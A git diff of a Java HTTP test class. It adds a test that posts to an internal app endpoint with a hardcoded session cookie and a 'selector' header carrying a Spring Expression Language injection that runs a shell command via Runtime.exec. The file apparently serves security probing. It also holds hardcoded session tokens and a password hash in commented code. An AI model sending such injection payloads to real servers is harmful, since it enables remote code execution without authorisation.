@@ -38,6 +38,40 @@ public class TestHttp {
     }
     
     @Test
+    public void postSingle() throws Exception {
+        String cookieValue = "6bd65ebee5484a4e9d91004aaa6ee843";
+        String action = "http://192.168.3.2/app/not/hidFT.action";
+        String json = "{\"appType\":\"2\",\"hmac\":\"Scunt32Krj0GMf8oT15keLM93F6yMczX0hsNoZFWzCZ+Z0SIb+/pDwYGawyzvM2BokoN9BGFLfqo21u5/1kycAXYDRBG8UnPs62T6DZoyuQwALgzZyiZ8zzY8KNnFPqLjjNv+UG/5oEieg7UCN2SikBmPcLcJ03riHoycOWTzGM=\",\"params\":{\"appVersion\":\"27\",\"appType\":\"2\"},\"currentVersion\":\"27\"}";
+        StringEntity paras = new StringEntity(json);;
+        paras.setContentEncoding("UTF-8");
+        paras.setContentType("application/json");
+        
+        Map<String, String> headerKVs = new HashMap<>();
+        headerKVs.put("Accept", "application/json, text/javascript, */*; q=0.01");
+        headerKVs.put("selector", "T(java.lang.Runtime).getRuntime().exec('touch aaaaaaaa')");
+    
+        String result = WebRequestClient.testLinkPost(action, "JSESSIONID", cookieValue, paras , headerKVs);
+        System.out.println(result);
+    }
+    
+    @Test
+    public void postSinglePress() throws IOException {
+        String cookieValue = "a809b35f66fa45f393fa7d7ba737505f";
+//        String action = "app/bos/finance/financeInvest.action";
+//        String json = "{\"params\":{\"checkPwd\":\"7c4a8d09ca3762af61e59520943dc26494f8941b\",\"fid\":\"11886\",\"financeMoney\":\"200\"},\"hmac\":\"CBSDWEY34nIi+e04jlxxFrp2Er10NzxW0wevsbhERY9YxypGTq3gQSbkhjyeKkCxIQcHEqx4t9CHkPRB/7nF3dLD4FA0pPS2AmuIqRo2gkSxgMyTJz8occocao1ha4Gfr0jmTE0ep3BlZb/lIh35Wx8AFa+CiXrUvzFyOHeT1tk=\"}\n";
+//        String cookieValue = "8c593810de1447f987bde834f24900b6";
+//        String action = "promotion-service/advertisement/not/queryShopAdvertList.action";
+//        String json = "{\"hmac\": \"4931fc0765a17293c8635b1759724e146b078193\", \"params\": {\"bannerType\": \"1\"}}";
+        String action = "app/bos/traderecord/traderecordlist.action";
+        String json = " {\"curPage\":1,\"params\":{\"monthLine\":\"\"},\"hmac\":\"I+cQxcZ4TUtaj6+iSJbiNHXqFuJADk2hYrTh+gSXCF8baZpMpUoXGsfM0PUVSjXGNnByG9iNri+GRn0LSwG2dk0KPH0TtkdRQOjr7ocXdBdTei3yueIUcn7L/V3aQJwZP0c8U272Upq1DagxyjxuYOiA2VMia+QRQAGfWJQ0+vU=\"}";
+        StringEntity paras = new StringEntity(json);;
+        paras.setContentEncoding("UTF-8");
+        paras.setContentType("application/json");
+        String result = post(action, "JSESSIONID", cookieValue, paras);
+        System.out.println("result:" + result);
+    }
+    
+    @Test
     public void getTest(){
         String result = null;
         
@@ -135,23 +169,6 @@ public class TestHttp {
             return;
         }
         System.out.println(action + ":" + result);
-    }
-    
-    @Test
-    public void postSinglePress() throws IOException {
-        String cookieValue = "a809b35f66fa45f393fa7d7ba737505f";
-//        String action = "app/bos/finance/financeInvest.action";
-//        String json = "{\"params\":{\"checkPwd\":\"7c4a8d09ca3762af61e59520943dc26494f8941b\",\"fid\":\"11886\",\"financeMoney\":\"200\"},\"hmac\":\"CBSDWEY34nIi+e04jlxxFrp2Er10NzxW0wevsbhERY9YxypGTq3gQSbkhjyeKkCxIQcHEqx4t9CHkPRB/7nF3dLD4FA0pPS2AmuIqRo2gkSxgMyTJz8occocao1ha4Gfr0jmTE0ep3BlZb/lIh35Wx8AFa+CiXrUvzFyOHeT1tk=\"}\n";
-//        String cookieValue = "8c593810de1447f987bde834f24900b6";
-//        String action = "promotion-service/advertisement/not/queryShopAdvertList.action";
-//        String json = "{\"hmac\": \"4931fc0765a17293c8635b1759724e146b078193\", \"params\": {\"bannerType\": \"1\"}}";
-        String action = "app/bos/traderecord/traderecordlist.action";
-        String json = " {\"curPage\":1,\"params\":{\"monthLine\":\"\"},\"hmac\":\"I+cQxcZ4TUtaj6+iSJbiNHXqFuJADk2hYrTh+gSXCF8baZpMpUoXGsfM0PUVSjXGNnByG9iNri+GRn0LSwG2dk0KPH0TtkdRQOjr7ocXdBdTei3yueIUcn7L/V3aQJwZP0c8U272Upq1DagxyjxuYOiA2VMia+QRQAGfWJQ0+vU=\"}";
-        StringEntity paras = new StringEntity(json);;
-        paras.setContentEncoding("UTF-8");
-        paras.setContentType("application/json");
-        String result = post(action, "JSESSIONID", cookieValue, paras);
-        System.out.println("result:" + result);
     }
     
     private ConcurrentHashMapExtend<String, String, Integer> buildOldUrls(){
